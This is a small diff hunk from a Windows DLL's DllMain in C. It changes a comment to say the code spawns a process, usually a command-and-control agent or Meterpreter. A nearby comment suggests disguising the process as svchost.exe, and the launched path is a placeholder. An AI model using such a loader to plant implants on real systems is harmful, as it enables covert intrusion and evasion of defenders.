@@ -19,7 +19,7 @@ BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
         
         si.cb = sizeof(STARTUPINFO);
 
-        // Path to your Payload executable
+        // this program is created for spawning a process, generally using for spawn highlevel c2-agent or meterpreter
         // Better result use "C:\Windows\svchost.exe" original SVC Host located on System32 Folder
         LPCSTR command = "C:\\blabla.exe";
 
